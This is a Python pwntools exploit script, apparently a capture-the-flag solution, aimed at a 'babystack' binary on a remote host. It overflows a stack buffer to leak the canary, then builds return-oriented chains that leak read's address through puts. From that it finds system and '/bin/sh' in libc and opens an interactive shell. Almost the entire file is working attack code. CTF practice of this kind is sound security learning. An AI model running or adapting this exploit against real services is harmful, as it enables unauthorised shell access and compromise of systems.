from pwn import *
from LibcSearcher import *

# p = process('/home/nop/Desktop/babystack')
p = remote('149.129.103.121',10001)

payload = 'A'*0x88 + 'B'	# 'B' cover the canary lower 8 bit

p.recv()
p.send('1')	# choice 1 option to input payload
p.send(payload)
sleep(0.1)
p.send('2')	# choice 2 option to get the value of canary
p.recvuntil('B')	# when get character 'B', store the value
canary = u64('\x00'+p.recv(7))	# add the lower 8 bit('\x00')
log.info('canary = %#x',canary)

p.recv()    # read the trash data
p.send('1')	# choice 1 option to couse stack overflow

pop_rdi = 0x400a93
elf = ELF('/home/nop/Desktop/babystack')
puts_plt = elf.symbols['puts']
read_got = elf.got['read']
log.info('puts_plt = %#x, read_got = %#x'%(puts_plt,read_got))

payload1 = 'A'*0x88 + p64(canary) + 'B'*8
payload1 += p64(pop_rdi) + p64(read_got) + p64(puts_plt) + p64(0x400720)
p.send(payload1)
sleep(3)
p.recvuntil("\n>> ")	# read the trash data
p.send('3')	# choice 3 option to make the stack crash
sleep(1)
read_addr = u64(p.recv()[:6].ljust(8,'\x00'))
log.info('read_addr = %#x',read_addr)

libc = LibcSearcher('read',read_addr)
libc_base = read_addr - libc.dump('read')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
log.info("system_addr = %#x, binsh_addr = %#x"%(system_addr,binsh_addr))
sleep(1)

p.send('1') # choice 1 option to couse stack overflow

payload2 = 'A'*0x88 + p64(canary) + 'B'*8
payload2 += p64(pop_rdi) + p64(binsh_addr) + p64(system_addr) + p64(0x400720)
p.send(payload2)
sleep(0.1)

p.send('3') # choice 3 option to make the stack crash
sleep(1)
p.interactive()
